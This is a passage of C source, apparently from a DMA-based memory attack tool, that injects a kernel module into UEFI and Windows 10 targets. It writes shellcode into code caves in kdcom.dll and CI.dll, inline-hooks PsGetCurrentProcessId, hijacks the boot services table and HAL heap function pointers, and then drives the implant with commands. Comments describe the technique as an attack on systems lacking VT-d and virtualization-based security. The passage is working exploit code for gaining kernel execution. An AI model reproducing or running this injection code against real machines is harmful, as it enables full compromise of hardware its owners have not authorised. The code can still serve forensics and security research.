    //------------------------------------------------
    if(!ctxMain->cfg.qwEFI_IBI_SYST) {
        result = KMDOpen_UEFI_FindEfiBase();
        if(!result) {
            printf("KMD: Failed. EFI system table not found.\n");
            return FALSE;
        }
    }
    result = DeviceReadDMA_Retry(ctxMain->hLC, ctxMain->cfg.qwEFI_IBI_SYST & ~0xfff, 0x2000, pb);
    result = result && (0x5453595320494249 == *(PQWORD)(pb + (ctxMain->cfg.qwEFI_IBI_SYST & 0xfff)));
    qwAddrEFI_BOOTSERV = *(PQWORD)(pb + (ctxMain->cfg.qwEFI_IBI_SYST & 0xfff) + 0x60);
    qwAddrEFI_RUNTSERV = *(PQWORD)(pb + (ctxMain->cfg.qwEFI_IBI_SYST & 0xfff) + 0x58);
    result = result && qwAddrEFI_RUNTSERV && (0 == (qwAddrEFI_RUNTSERV & 0xffffffff00000007));
    result = result && qwAddrEFI_BOOTSERV && (0 == (qwAddrEFI_BOOTSERV & 0xffffffff00000007));
    if(!result) {
        printf("KMD: Failed. Error reading or interpreting memory #1 at: 0x%llx\n", ctxMain->cfg.qwEFI_IBI_SYST);
        return FALSE;
    }
    result = LcRead(ctxMain->hLC, qwAddrEFI_BOOTSERV & ~0xfff, 0x2000, pb);
    result = result && (0x56524553544f4f42 == *(PQWORD)(pb + (qwAddrEFI_BOOTSERV & 0xfff)));
    qwAddrHookedFunction = *(PQWORD)(pb + (qwAddrEFI_BOOTSERV & 0xfff) + bOffsetHookBootServices);
    result = result && qwAddrHookedFunction && (0 == (qwAddrHookedFunction & 0xffffffff00000000));
    if(!result) {
        printf("KMD: Failed. Error reading or interpreting memory #2 at: 0x%llx :: 0x%llx\n", ctxMain->cfg.qwEFI_IBI_SYST, qwAddrEFI_BOOTSERV);
        return FALSE;
    }
    //------------------------------------------------
    // 2: Prepare Patch
    //------------------------------------------------
    memset(pb, 0, 0x2000);
    Util_ParseHexFileBuiltin("DEFAULT_UEFI_X64", pb + 0x1000, 0x1000, &cb);
    *(PDWORD)(pb + 0x1004) = (DWORD)ctxMain->cfg.qwEFI_IBI_SYST;
    *(PDWORD)(pb + 0x1008) = (DWORD)(qwAddrEFI_BOOTSERV + bOffsetHookBootServices);
    *(PDWORD)(pb + 0x100C) = (DWORD)qwAddrHookedFunction;
    //------------------------------------------------
    // 3: Patch
    //------------------------------------------------
    if(ctxMain->cfg.fVerbose) {
        printf("INFO: IBI SYST:   0x%08x\n", (DWORD)ctxMain->cfg.qwEFI_IBI_SYST);
        printf("INFO: BOOTSERV:   0x%08x\n", (DWORD)qwAddrEFI_BOOTSERV);
    }
    result = DeviceWriteDMA_Retry(ctxMain->hLC, qwAddrKMDDATA, 0x2000, pb);
    if(!result) {
        printf("KMD: Failed. Failed writing to memory #1.\n");
        return FALSE;
    }
    qwAddrKMD = qwAddrKMDDATA + 0x1000;
    result = DeviceWriteDMA_Retry(ctxMain->hLC, qwAddrEFI_BOOTSERV + bOffsetHookBootServices, 8, (PBYTE)&qwAddrKMD);
    if(!result) {
        printf("KMD: Failed. Failed writing to memory #2.\n");
        return FALSE;
    }
    //------------------------------------------------
    // 4: Wait for execution
    //------------------------------------------------
    printf("KMD: Waiting to receive execution.\n");
    do {
        Sleep(100);
        if(!DeviceReadDMA_Retry(ctxMain->hLC, qwAddrKMDDATA, 0x1000, pb)) {
            printf("KMD: Failed. DMA Read failed while waiting to receive physical address.\n");
            return FALSE;
        }
    } while(KMDDATA_MAGIC != *(PQWORD)pb);
    //------------------------------------------------
    // 5: Retrieve Memory Map
    // (ugly to issue a 2nd unnecessary DMA write, but works to reuse code)
    //------------------------------------------------
    return KMD_SetupStage3((DWORD)qwAddrKMDDATA, pb + 0x1000, 0x1000);
}

#ifdef WIN32

/*
* Load a kernel module (KMD) into a Windows 10 system on which not both of
* Vt-d and Virtualization Based Security is enabled. This technique relies
* on analysis by MemProcFS (vmm.dll) which currently only is a Windows module.
* as a result the initial attack may currently only take place from Windows
* attackers.
* The technique puts the executable shellcode inside a code cave inside the
* .text section of kdcom.dll.
* It also patches HalBugCheckSystem to create a 'safe' landing function for
* for thread creation via PsCreateSystemThread.
* It also patches function pointer table in HAL heap to gain initial execution.
*/
_Success_(return)
BOOL KMDOpen_WINX64_2_VMM()
{
    BOOL result = FALSE;
    BYTE pbPage[0x1000];
    BYTE pbExec[0x800], pbExecVerify[0x800];
    DWORD cbExec = 0, cbMemMap = 0;
    QWORD i = 0, j;
    PVMMDLL_MAP_PTE pMemMap = NULL;
    DWORD cSections;
    PIMAGE_SECTION_HEADER pSections = NULL;
    QWORD vaBaseKdCom, vaBaseNtoskrnl;
    QWORD vaExec = 0, vaData = 0;
    QWORD vaHook, qwHookOrig;
    DWORD dwHookOffset;
    QWORD paData, paKMD = 0;
    QWORD qwTMP, vaHalBugCheckSystem;
    BYTE pbHalBugCheckSystem_Orig[16] = { 0 };
    // ------------------------------------------------------------------------
    // 1: Initialize MemProcFS/vmm.dll
    // ------------------------------------------------------------------------
    if(!Vmmx_Initialize(FALSE, FALSE)) {
        printf("KMD: Failed initializing required MemProcFS/vmm.dll\n");
        return FALSE;
    }
    // ------------------------------------------------------------------------
    // 2: Locate sections where to insert:
    //    code: (kdcom.dll '.text' section)
    //    data: (kdcom.dll '.data' section)
    //    hal.dll!HalBugCheckSystem (used for 'hook' to provide valid landing
    //             site for PsCreateSystemThread -> no security bugchecks...)
    // ------------------------------------------------------------------------
    vaBaseKdCom = VMMDLL_ProcessGetModuleBase(4, L"kdcom.dll");
    vaBaseNtoskrnl = VMMDLL_ProcessGetModuleBase(4, L"ntoskrnl.exe");
    vaHalBugCheckSystem = VMMDLL_ProcessGetProcAddress(4, L"hal.dll", "HalBugCheckSystem");
    if(!vaBaseKdCom || !vaBaseNtoskrnl || !vaHalBugCheckSystem) {
        printf("KMD: Failed vmm.dll!ProcessGetModuleBase (kdcom.dll/ntoskrnl.exe)\n");
        goto fail;
    }
    if(!VMMDLL_ProcessGetSections(4, L"kdcom.dll", NULL, 0, &cSections) || !cSections) {
        printf("KMD: Failed vmm.dll!ProcessGetSections (kdcom.dll) #1\n");
        goto fail;
    }
    pSections = LocalAlloc(LMEM_ZEROINIT, cSections * sizeof(IMAGE_SECTION_HEADER));
    if(!pSections) { goto fail; }
    if(!VMMDLL_ProcessGetSections(4, L"kdcom.dll", pSections, cSections, &cSections)) {
        printf("KMD: Failed vmm.dll!ProcessGetSections (kdcom.dll) #2\n");
        goto fail;
    }
    for(i = 0; i < cSections; i++) {
        if(!strcmp(".text", pSections[i].Name)) {
            vaExec = pSections[i].VirtualAddress + vaBaseKdCom + 0x800;
        }
        if(!strcmp(".data", pSections[i].Name)) {
            vaData = pSections[i].VirtualAddress + vaBaseKdCom + 0x800;
        }
    }
    if(!vaExec || !vaData) { goto fail; }
    VMMDLL_MemVirt2Phys(4, vaData, &paData);
    VMMDLL_MemRead(4, vaHalBugCheckSystem, pbHalBugCheckSystem_Orig, 16);
    // ------------------------------------------------------------------------
    // 3: Check if inject is already active!
    // ------------------------------------------------------------------------
    if(VMMDLL_MemReadEx(4, vaData, (PBYTE)&paKMD, sizeof(QWORD), NULL, VMMDLL_FLAG_NOCACHE) && paKMD) {
        goto success_kmd_load;
    }
    // ------------------------------------------------------------------------
    // 4: Search for memory map entries between 0xfffff78000000000 - 0xfffff7ffffffffff
    //    i.e. function table in hal.dll heap. Result is address of function pointer to
    //    place hook upon.
    // ------------------------------------------------------------------------
    if(!VMMDLL_Map_GetPte(4, NULL, &cbMemMap, FALSE) || !cbMemMap) {
        printf("KMD: Failed vmm.dll!Map_GetPte #1.\n");
        goto fail;
    }
    pMemMap = LocalAlloc(LMEM_ZEROINIT, cbMemMap);
    if(!pMemMap) { goto fail; }
    if(!VMMDLL_Map_GetPte(4, pMemMap, &cbMemMap, FALSE)) {
        printf("KMD: Failed vmm.dll!Map_GetPte #2.\n");
        goto fail;
    }
    while(TRUE) {
        i++;
        if((i == pMemMap->cMap) || (pMemMap->pMap[i].vaBase > 0xfffff7ffffffffff)) {
            printf("KMD: Failed locating function hook pointer.\n");
            goto fail;
        }
        if(pMemMap->pMap[i].vaBase < 0xfffff78000000000) { continue; }
        for(j = 0; j < pMemMap->pMap[i].cPages; j++) {
            vaHook = pMemMap->pMap[i].vaBase + (j << 12);
            VMMDLL_MemReadPage(4, vaHook, pbPage);
            if(KMD_Win_SearchTableHalpApicRequestInterrupt(pbPage, vaHook, &dwHookOffset)) {
                vaHook += dwHookOffset;
                goto success_locate_hook; // lvl2 loop breakout with goto
            }
        }
    }
success_locate_hook:
    if(!VMMDLL_MemRead(4, vaHook, (PBYTE)&qwHookOrig, sizeof(QWORD))) {
        printf("KMD: Failed vmm.dll!MemRead #1.\n");
        goto fail;
    }
    // ------------------------------------------------------------------------
    // 5: prepare shellcode
    // ------------------------------------------------------------------------
    Util_ParseHexFileBuiltin("DEFAULT_WINX64_STAGE23_VMM", pbExec, sizeof(pbExec), &cbExec);
    *(PQWORD)(pbExec + 0x08) = vaData + 0x08;                   // shellcode atomicity check (cmpxchg_flag address)
    *(PQWORD)(pbExec + 0x10) = qwHookOrig;                      // original (non-hooked) JMP to address
    *(PQWORD)(pbExec + 0x18) = vaData + 0x10;                   // DEBUG data address
    *(PQWORD)(pbExec + 0x20) = vaData;                          // KMDDATA physical address
    *(PQWORD)(pbExec + 0x28) = vaBaseNtoskrnl;                  // NTOSKRNL.EXE virtual address
    *(PQWORD)(pbExec + 0x30) = VMMDLL_ProcessGetProcAddress(4, L"ntoskrnl.exe", "MmAllocateContiguousMemory");
    *(PQWORD)(pbExec + 0x38) = VMMDLL_ProcessGetProcAddress(4, L"ntoskrnl.exe", "PsCreateSystemThread");
    *(PQWORD)(pbExec + 0x40) = VMMDLL_ProcessGetProcAddress(4, L"ntoskrnl.exe", "MmGetPhysicalAddress");
    *(PQWORD)(pbExec + 0x48) = VMMDLL_ProcessGetProcAddress(4, L"ntoskrnl.exe", "KeGetCurrentIrql");
    *(PQWORD)(pbExec + 0x50) = vaHalBugCheckSystem;
    // ------------------------------------------------------------------------
    // 6: hook and watch for execution & restore
    // ------------------------------------------------------------------------
    qwTMP = 0x0000000025ff9090;
    VMMDLL_MemWrite(4, vaHalBugCheckSystem, (PBYTE)&qwTMP, 8);
    qwTMP = vaExec + 2;
    VMMDLL_MemWrite(4, vaHalBugCheckSystem + 8, (PBYTE)&qwTMP, 8);
    if(!VMMDLL_MemWrite(4, vaExec, pbExec, 0x800) || !VMMDLL_MemRead(4, vaExec, pbExecVerify, 0x800) || memcmp(pbExec, pbExecVerify, 0x800)) {
        printf("KMD: Failed vmm.dll!MemWrite (kdcom.dll) #2.\n");
        goto fail;
    }
    if(!VMMDLL_MemWrite(4, vaHook, (PBYTE)&vaExec, sizeof(QWORD))) {
        printf("KMD: Failed vmm.dll!MemWrite (kdcom.dll) #3.\n");
        goto fail;
    }
    printf("KMD: Code inserted into the kernel - Waiting to receive execution.\n");
    do {
        Sleep(100);
        if(!VMMDLL_MemReadEx(4, vaData, (PBYTE)&paKMD, sizeof(QWORD), NULL, VMMDLL_FLAG_NOCACHE)) {
            printf("KMD: Failed. DMA Read failed while waiting to receive physical address.\n");
            goto fail;
        }
    } while(paKMD == 0);
    printf("KMD: Execution received - continuing ...\n");
    VMMDLL_MemWrite(4, vaHook, (PBYTE)&qwHookOrig, sizeof(QWORD));
    VMMDLL_MemWrite(4, vaHalBugCheckSystem, pbHalBugCheckSystem_Orig, 16);
    ZeroMemory(pbPage, 0x1000);
    VMMDLL_MemWrite(4, vaData, pbPage, 0x800);
    //------------------------------------------------
    // 7: Set up reference to KMD.
    //------------------------------------------------
success_kmd_load:
    if(ctxMain->cfg.fVerbose) {
        printf("INFO: PA KMD BASE:  0x%08x\n", (DWORD)paKMD);
    }
    ctxMain->phKMD = (PKMDHANDLE)LocalAlloc(LMEM_ZEROINIT, sizeof(KMDHANDLE));
    if(!ctxMain->phKMD) { goto fail; }
    ctxMain->phKMD->pk = (PKMDDATA)ctxMain->phKMD->pbPageData;
    ctxMain->pk = ctxMain->phKMD->pk;
    ctxMain->phKMD->dwPageAddr32 = (DWORD)paKMD;
    LcRead(ctxMain->hLC, ctxMain->phKMD->dwPageAddr32, 4096, ctxMain->phKMD->pbPageData);
    //------------------------------------------------
    // 8: Retrieve physical memory range map and complete open action.
    //------------------------------------------------
    if(!KMD_GetPhysicalMemoryMap()) {
        printf("KMD: Failed. Failed to retrieve physical memory map.\n");
        printf("             KMD _may_ still be located at: 0x%08x\n", (DWORD)paKMD);
        KMDClose();
        goto fail;
    }
    ctxMain->cfg.qwKMD = ctxMain->phKMD->dwPageAddr32;
    if(ctxMain->pk->MAGIC != KMDDATA_MAGIC) {
        ctxMain->pk->MAGIC = KMDDATA_MAGIC;
        LcWrite(ctxMain->hLC, ctxMain->phKMD->dwPageAddr32, sizeof(QWORD), ctxMain->phKMD->pbPageData);
    }
    result = TRUE;
fail:
    LocalFree(pSections);
    LocalFree(pMemMap);
    Vmmx_Close();
    return result;
}

/*
* Load a kernel module (KMD) into a Windows 10 system on which not both of
* Vt-d and Virtualization Based Security is enabled. This technique relies
* on analysis by MemProcFS (vmm.dll) which currently only is a Windows module.
* as a result the initial attack may currently only take place from Windows
* attackers.
* The technique puts the executable shellcode inside a code cave inside CI.dll.
* Initial code execution is gained by placing an inline hook in nt!PsGetCurrentProcessId
*/
_Success_(return)
BOOL KMDOpen_WINX64_3_VMM()
{
    BOOL f, fResult = FALSE;
    QWORD vaHook, vaCI, vaDataPre = 0, vaExec = 0;
    DWORD i, cSections, dwHookJMP, paKMD = 0, cbShellcode = 0;
    BYTE pbShellcode[0xc00], pbShellcodeVerify[0xc00], pbHookOriginalData[0x14], pbHook[13] = { 0 }, pbZero20[0x20] = { 0 };
    PIMAGE_SECTION_HEADER pSections = NULL;
    // ------------------------------------------------------------------------
    // 1: Initialize MemProcFS/vmm.dll
    // ------------------------------------------------------------------------
    if(!Vmmx_Initialize(FALSE, FALSE)) {
        printf("KMD: Failed initializing required MemProcFS/vmm.dll #1\n");
        return FALSE;
    }
    // ------------------------------------------------------------------------
    // 2: Load Signature.
    // ------------------------------------------------------------------------
    if(!Util_ParseHexFileBuiltin("DEFAULT_WINX64_STAGE23_VMM3", pbShellcode, sizeof(pbShellcode), &cbShellcode)) { goto fail; }
    // ------------------------------------------------------------------------
    // 3: Locate locations where to insert
    //    code: (CI.dll 'INIT'  section)
    //    data: (CI.dll '.data' section)
    //    hook: (nt!PsGetCurrentProcessId)
    // ------------------------------------------------------------------------
    f = (vaCI = VMMDLL_ProcessGetModuleBase(4, L"CI.dll")) &&
        VMMDLL_ProcessGetSections(4, L"CI.dll", NULL, 0, &cSections) &&
        cSections &&
        (pSections = LocalAlloc(LMEM_ZEROINIT, cSections * sizeof(IMAGE_SECTION_HEADER))) &&
        VMMDLL_ProcessGetSections(4, L"CI.dll", pSections, cSections, &cSections);
    for(i = 0; f && (i < cSections); i++) {
        if(!strcmp("INIT", pSections[i].Name)) {
            vaExec = vaCI + pSections[i].VirtualAddress + 0x400;
        }
        if(!strcmp(".data", pSections[i].Name)) {
            vaDataPre = ((vaCI + pSections[i].VirtualAddress + pSections[i].Misc.VirtualSize + 0xfff) & ~0xfff) - 0x20;
        }
    }
    if(!f || !vaExec || !vaDataPre) {
        printf("KMD: Failed get code cave (CI.dll) #2\n");
        goto fail;
    }
    f = (vaHook = VMMDLL_ProcessGetProcAddress(4, L"ntoskrnl.exe", "PsGetCurrentProcessId")) &&
        VMMDLL_MemRead(4, vaHook, pbHookOriginalData, sizeof(pbHookOriginalData));
    if(!f) {
        printf("KMD: Failed get hook (ntoskrnl.exe) #3\n");
        goto fail;
    }
    if((pbHookOriginalData[0x00] == 0xE9)) {
        printf("KMD: Hook already inserted #4\n");
        goto fail_hookrestore;
    }
    // ------------------------------------------------------------------------
    // 4: Prepare and Inject!
    // ------------------------------------------------------------------------
    f = (*(PQWORD)(pbShellcode + 0x020) = VMMDLL_ProcessGetProcAddress(4, L"ntoskrnl.exe", "KeGetCurrentIrql")) &&
        (*(PQWORD)(pbShellcode + 0x028) = VMMDLL_ProcessGetProcAddress(4, L"ntoskrnl.exe", "PsCreateSystemThread")) &&
        (*(PQWORD)(pbShellcode + 0x030) = VMMDLL_ProcessGetProcAddress(4, L"ntoskrnl.exe", "ZwClose")) &&
        (*(PQWORD)(pbShellcode + 0x038) = VMMDLL_ProcessGetProcAddress(4, L"ntoskrnl.exe", "MmAllocateContiguousMemory")) &&
        (*(PQWORD)(pbShellcode + 0x040) = VMMDLL_ProcessGetProcAddress(4, L"ntoskrnl.exe", "MmGetPhysicalAddress")) &&
        (*(PQWORD)(pbShellcode + 0x048) = VMMDLL_ProcessGetModuleBase(4, L"ntoskrnl.exe"));
    if(!f) {
        printf("KMD: Failed get functions (ntoskrnl.exe) #5\n");
        goto fail;
    }
    *(PQWORD)(pbShellcode + 0x018) = vaDataPre;
    memcpy(pbShellcode + 0x004, pbHookOriginalData, sizeof(pbHookOriginalData));
    if(!VMMDLL_MemWrite(4, vaExec, pbShellcode, cbShellcode) || !VMMDLL_MemRead(4, vaExec, pbShellcodeVerify, cbShellcode) || memcmp(pbShellcode, pbShellcodeVerify, cbShellcode)) {
        printf("KMD: Failed MemWrite (CI.dll) #6\n");
        goto fail;
    }
    if((vaHook - vaExec > 0x7fff0000) && (vaExec - vaHook > 0x7fff0000)) {
        // ABSOLUTE JMP [MOV r10, addr + JMP r10]
        pbHook[0] = 0x49;
        pbHook[1] = 0xBA;
        *(PQWORD)(pbHook + 2) = vaExec;
        pbHook[10] = 0x41;
        pbHook[11] = 0xFF;
        pbHook[12] = 0xE2;
    } else {
        // RELATIVE JMP
        pbHook[0] = 0xE9;   // JMP
        *(PDWORD)(pbHook + 1) = (dwHookJMP = (DWORD)(vaExec - (vaHook + 5ULL)));
    }
    if(!VMMDLL_MemWrite(4, vaHook, pbHook, sizeof(pbHook))) {
        printf("KMD: Failed MemWrite (ntoskrnl.exe) #7\n");
        goto fail;
    }
    // ------------------------------------------------------------------------
    // 5: Wait for execution.
    // ------------------------------------------------------------------------
    printf("KMD: Code inserted into the kernel - Waiting to receive execution.\n");
    do {
        Sleep(100);
        if(!VMMDLL_MemReadEx(4, vaDataPre + 0x1c, (PBYTE)&paKMD, sizeof(DWORD), NULL, VMMDLL_FLAG_NOCACHE)) {
            printf("KMD: Failed. DMA Read failed while waiting to receive physical address.\n");
            goto fail_hookrestore;
        }
    } while(paKMD == 0);
    printf("KMD: Execution received - continuing ...\n");
    //------------------------------------------------
    // 6: Set up reference to KMD.
    //------------------------------------------------
    if(ctxMain->cfg.fVerbose) {
        printf("INFO: PA KMD BASE:  0x%08x\n", (DWORD)paKMD);
    }
    ctxMain->phKMD = (PKMDHANDLE)LocalAlloc(LMEM_ZEROINIT, sizeof(KMDHANDLE));
    if(!ctxMain->phKMD) { goto fail; }
    ctxMain->phKMD->pk = (PKMDDATA)ctxMain->phKMD->pbPageData;
    ctxMain->pk = ctxMain->phKMD->pk;
    ctxMain->phKMD->dwPageAddr32 = (DWORD)paKMD;
    LcRead(ctxMain->hLC, ctxMain->phKMD->dwPageAddr32, 4096, ctxMain->phKMD->pbPageData);
    //------------------------------------------------
    // 7: Retrieve physical memory range map and complete open action.
    //------------------------------------------------
    if(!KMD_GetPhysicalMemoryMap()) {
        printf("KMD: Failed. Failed to retrieve physical memory map.\n");
        printf("             KMD _may_ still be located at: 0x%08x\n", (DWORD)paKMD);
        KMDClose();
        goto fail_hookrestore;
    }
    ctxMain->cfg.qwKMD = ctxMain->phKMD->dwPageAddr32;
    if(ctxMain->pk->MAGIC != KMDDATA_MAGIC) {
        ctxMain->pk->MAGIC = KMDDATA_MAGIC;
        LcWrite(ctxMain->hLC, ctxMain->phKMD->dwPageAddr32, sizeof(QWORD), ctxMain->phKMD->pbPageData);
    }
    fResult = TRUE;
fail_hookrestore:
    VMMDLL_MemWrite(4, vaHook, pbHookOriginalData, sizeof(pbHookOriginalData));
    VMMDLL_MemWrite(4, vaDataPre, pbZero20, sizeof(pbZero20));
fail:
    LocalFree(pSections);
    Vmmx_Close();
    return fResult;
}

#endif /* WIN32 */
#ifdef LINUX

BOOL KMDOpen_WINX64_2_VMM()
{
    printf("KMD: Failed. Not supported on Linux.\n");
    return FALSE;
}
BOOL KMDOpen_WINX64_3_VMM()
{
    printf("KMD: Failed. Not supported on Linux.\n");
    return FALSE;
}

#endif /* LINUX */

// https://blog.coresecurity.com/2016/08/25/getting-physical-extreme-abuse-of-intel-based-paging-systems-part-3-windows-hals-heap/
// HAL is statically located at: ffffffffffd00000 (win8.1/win10 pre 1703)
// HAL is randomized between: fffff78000000000:fffff7ffc0000000 (win10 1703) [512 possible positions in PDPT]
_Success_(return)
BOOL KMDOpen_HalHijack()
{
    DWORD ADDR_HAL_HEAP_PA = 0x00001000;
    //QWORD ADDR_SHELLCODE_VA = 0xffffffffffc00100;
    BOOL result;
    SIGNATURE oSignature;
    PDWORD pdwPhysicalAddress;
    BYTE pbHal[0x1000] = { 0 }, pbPT[0x1000] = { 0 }, pbNULL[0x300] = { 0 };
    DWORD dwHookFnPgOffset;
    QWORD qwPML4, qwHalVA, qwAddrHalHeapVA, qwPTEOrig, qwPTEPA, qwPTPA, qwShellcodeVA;
    //------------------------------------------------
    // 1: Fetch hal.dll heap and perform sanity checks.
    //------------------------------------------------
    Util_CreateSignatureWindowsHalGeneric(&oSignature);
    result = DeviceReadDMA_Retry(ctxMain->hLC, ADDR_HAL_HEAP_PA, 0x1000, pbHal);
    qwPML4 = *(PQWORD)(pbHal + 0xa0);
    qwHalVA = *(PQWORD)(pbHal + 0x78);
    if(!result || (qwPML4 & 0xffffffff00000fff)) {
        printf("KMD: Failed. Error reading or interpreting memory #1.\n");
        return FALSE;
    }
    if(((qwHalVA & 0xfffffffffff00fff) != 0xffffffffffd00000) && ((qwHalVA & 0xffffff803fe00fff) != 0xfffff78000000000)) {
        printf("KMD: Failed. Error reading or interpreting memory #2.\n");
        return FALSE;
    }
    result = Util_PageTable_ReadPTE(qwPML4, qwHalVA, &qwPTEOrig, &qwPTEPA);
    if(!result || ((qwPTEOrig & 0x00007ffffffff003) != 0x1003)) {
        printf("KMD: Failed. Error reading or interpreting PTEs.\n");
        return FALSE;
    }
    //------------------------------------------------
    // 2: Search for function table in hal.dll heap.
    //------------------------------------------------
    result = FALSE;
    for(qwAddrHalHeapVA = (qwHalVA & 0xffffffffffd00000); qwAddrHalHeapVA < (qwHalVA & 0xffffffffffd00000) + 0x100000; qwAddrHalHeapVA += 0x1000) {
        result =
            Util_PageTable_ReadPTE(qwPML4, qwAddrHalHeapVA, &qwPTEOrig, &qwPTEPA) &&
            ((qwPTEOrig & 0x00007fff00000003) == 0x00000003) &&
            DeviceReadDMA_Retry(ctxMain->hLC, (qwPTEOrig & 0xfffff000), 0x1000, pbHal) &&
            KMD_Win_SearchTableHalpApicRequestInterrupt(pbHal, qwAddrHalHeapVA, &dwHookFnPgOffset);
        if(result) {
            break;
        }
    }
    if(!result) {
        printf("KMD: Failed. Failed finding entry point.\n");
        return FALSE;
    }
    qwPTPA = qwPTEPA & ~0xfff;
    result = DeviceReadDMA_Retry(ctxMain->hLC, (DWORD)qwPTPA, 0x1000, pbPT);
    if(!result || memcmp(pbPT + 0x200, pbNULL, 0x300)) { // 0x300 bytes between 0x200:0x500 in Hal PT must be zero
        printf("KMD: Failed. Error reading or interpreting PT.\n");
        return FALSE;
    }
    qwShellcodeVA = (qwAddrHalHeapVA & 0xffffffffffe00000) + 0x40000 + 0x210;
    //------------------------------------------------
    // 3: Write shellcode into page table empty space.
    //------------------------------------------------
    *(PQWORD)(pbPT + 0x200) = qwPTPA | 0x63; // PTE for addr
    memcpy(pbPT + 0x210, oSignature.chunk[3].pb, oSignature.chunk[3].cb);
    *(PQWORD)(pbPT + 0x210 + STAGE2_OFFSET_FN_STAGE1_ORIG) = *(PQWORD)(pbHal + dwHookFnPgOffset);
    *(PQWORD)(pbPT + 0x210 + STAGE2_OFFSET_EXTRADATA1) = qwAddrHalHeapVA + dwHookFnPgOffset;
    DeviceWriteDMA_Retry(ctxMain->hLC, qwPTPA + 0x200, 0x300, pbPT + 0x200);
    Util_PageTable_SetMode(qwPML4, qwShellcodeVA, TRUE);
    //------------------------------------------------
    // 4: Place hook by overwriting function addr in hal.dll heap.
    //------------------------------------------------
    Sleep(250);
    DeviceWriteDMA_Retry(ctxMain->hLC, (qwPTEOrig & 0xfffff000) + dwHookFnPgOffset, sizeof(QWORD), (PBYTE)&qwShellcodeVA);
    if(ctxMain->cfg.fVerbose) {
        printf("INFO: PA PT BASE:   0x%016llx\n", qwPML4);
        printf("INFO: PA PT:        0x%016llx\n", qwPTPA);
        printf("INFO: PA HAL HEAP:  0x%016llx\n", (qwPTEOrig & 0xfffff000) + dwHookFnPgOffset);
        printf("INFO: VA SHELLCODE: 0x%016llx\n", qwShellcodeVA);
    }
    printf("KMD: Code inserted into the kernel - Waiting to receive execution.\n");
    //------------------------------------------------
    // 5: wait for patch to reveive execution.
    //------------------------------------------------
    pdwPhysicalAddress = (PDWORD)(pbPT + 0x210 + STAGE2_OFFSET_STAGE3_PHYSADDR);
    do {
        Sleep(100);
        if(!DeviceReadDMA_Retry(ctxMain->hLC, (DWORD)qwPTPA, 4096, pbPT)) {
            printf("KMD: Failed. DMA Read failed while waiting to receive physical address.\n");
            return FALSE;
        }
    } while(!*pdwPhysicalAddress);
    printf("KMD: Execution received - continuing ...\n");
    //------------------------------------------------
    // 6: Restore hooks to original.
    //------------------------------------------------
    Sleep(250);
    LcWrite(ctxMain->hLC, qwPTPA + 0x200, 0x300, pbNULL);
    //------------------------------------------------
    // 7: Set up kernel module shellcode (stage3) and finish.
    //------------------------------------------------
    return KMD_SetupStage3(*pdwPhysicalAddress, oSignature.chunk[4].pb, 4096);
}

//-------------------------------------------------------------------------------
// KMD command function below.
//-------------------------------------------------------------------------------

_Success_(return)
BOOL KMD_IsRangeInPhysicalMap(_In_ PKMDHANDLE phKMD, _In_ QWORD qwBaseAddress, _In_ QWORD qwNumberOfBytes)
{
    QWORD i;
    PHYSICAL_MEMORY_RANGE pmr;
    for(i = 0; i < phKMD->cPhysicalMap; i++) {
        pmr = phKMD->pPhysicalMap[i];
        if(((pmr.BaseAddress <= qwBaseAddress) && (pmr.BaseAddress + pmr.NumberOfBytes >= qwBaseAddress + qwNumberOfBytes))) {
            return TRUE;
        }
    }
    return FALSE;
}

_Success_(return)
BOOL KMD_SubmitCommand(_In_ QWORD op)
{
    DWORD cFailCount;
    HANDLE hCallback = NULL;
    ctxMain->pk->_op = op;
    if(!LcWrite(ctxMain->hLC, ctxMain->phKMD->dwPageAddr32, 4096, ctxMain->phKMD->pbPageData)) {
        return FALSE;
    }
    do {
        cFailCount = 0;
        while(!DeviceReadDMA_Retry(ctxMain->hLC, ctxMain->phKMD->dwPageAddr32, 4096, ctxMain->phKMD->pbPageData)) {
            cFailCount++;
            if(cFailCount < 10) { usleep(250); continue; }
            if(cFailCount < 20) { SwitchToThread(); continue; }
            if(cFailCount < 30) { Sleep(100); continue; }
            Exec_CallbackClose(hCallback);
            return FALSE;
        }
        if((op != KMD_CMD_TERMINATE) && (op != KMD_CMD_MEM_INFO) && (ctxMain->pk->MAGIC != KMDDATA_MAGIC) && (ctxMain->pk->MAGIC != KMDDATA_MAGIC_PARTIAL)) {
            printf("PCILEECH: FAIL: KMDDATA corruption! - bit errors? Address: 0x%08x. Terminating.\n", ctxMain->phKMD->dwPageAddr32);
            LcClose(ctxMain->hLC);
            ExitProcess(0);
        }
        if(ctxMain->pk->_op == KMD_CMD_EXEC_EXTENDED) {
            Exec_Callback(&hCallback);
        }
    } while(((ctxMain->pk->_op != KMD_CMD_COMPLETED) || (ctxMain->pk->_status != 1)) && ctxMain->pk->_status < 0x0fffffff);
    if(hCallback) { Exec_CallbackClose(hCallback); }
    return TRUE;
}

VOID KMD_PhysicalMemoryMapDisplay(_In_ PKMDHANDLE phKMD)
{
    QWORD i;
    PHYSICAL_MEMORY_RANGE pmr;
    printf("Kernel reported memory map below:\n START              END               #PAGES\n");
    for(i = 0; i < phKMD->cPhysicalMap; i++) {
        pmr = phKMD->pPhysicalMap[i];
        printf(
            " %016llx - %016llx  %08llx\n",
            pmr.BaseAddress,
            pmr.BaseAddress + pmr.NumberOfBytes - 1,
            pmr.NumberOfBytes / 0x1000);
    }
    printf("----------------------------------------------\n");
}

_Success_(return)
BOOL KMD_GetPhysicalMemoryMap()
{
    QWORD qwMaxMemoryAddress;
    KMD_SubmitCommand(KMD_CMD_MEM_INFO);
    if(!ctxMain->pk->_result || !ctxMain->pk->_size) { return FALSE; }
    ctxMain->phKMD->pPhysicalMap = LocalAlloc(LMEM_ZEROINIT, (ctxMain->pk->_size + 0x1000) & 0xfffff000);
    if(!ctxMain->phKMD->pPhysicalMap) { return FALSE; }
    DeviceReadDMA(ctxMain->pk->DMAAddrPhysical, (DWORD)((ctxMain->pk->_size + 0x1000) & 0xfffff000), (PBYTE)ctxMain->phKMD->pPhysicalMap, NULL);
    ctxMain->phKMD->cPhysicalMap = ctxMain->pk->_size / sizeof(PHYSICAL_MEMORY_RANGE);
    if(ctxMain->phKMD->cPhysicalMap > 0x2000) { return FALSE; }
    // adjust max memory according to physical memory
    qwMaxMemoryAddress = ctxMain->phKMD->pPhysicalMap[ctxMain->phKMD->cPhysicalMap - 1].BaseAddress;
    qwMaxMemoryAddress += ctxMain->phKMD->pPhysicalMap[ctxMain->phKMD->cPhysicalMap - 1].NumberOfBytes;
    if(qwMaxMemoryAddress > 0x0000ffffffffffff) { return FALSE; }
